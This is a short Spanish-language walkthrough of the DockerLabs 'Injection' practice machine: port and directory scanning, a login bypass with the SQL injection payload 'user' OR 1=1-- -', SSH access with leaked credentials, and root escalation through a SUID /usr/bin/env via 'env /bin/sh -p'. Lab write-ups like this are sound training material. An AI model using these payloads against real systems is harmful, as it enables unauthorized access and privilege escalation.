---
title: "DockerLabs - Injection"
difficulty: "Fácil"
source: "DockerLabs"
---

Injection es una máquina específica para practicar inyección SQL y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh injection.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sV -p- 172.17.0.2
```

Hacemos `curl` a la página para visualizar su contenido:

```bash
curl http://172.17.0.2
```

Para ver los subdirectorios de la página, usamos `gobuster`:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50
```

## Explotación

Encontramos un formulario de login, donde intuimos que se usa una base de datos, muy probablemente MySQL. Probamos el caso más típico de inyección SQL:

```
Usuario: user' OR 1=1-- -
Contraseña: (cualquiera)
```

Efectivamente, conseguimos acceso. La página `auth_valid` nos muestra el usuario y contraseña para acceder por SSH:

```bash
ssh dylan@172.17.0.2
```

## Escalada de privilegios

Una vez dentro, lanzamos los siguientes comandos para comprobar si tenemos permisos sudo sobre algún fichero o directorio:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Este último comando busca ficheros con el bit SUID, que permite ejecutarlos como root.

Encontramos `/usr/bin/env`, que resulta bastante prometedor. Probamos a abrir una terminal con él:

```bash
env /bin/sh -p
```

## Conclusión

Éxito: acceso root conseguido. Laboratorio finalizado con éxito.
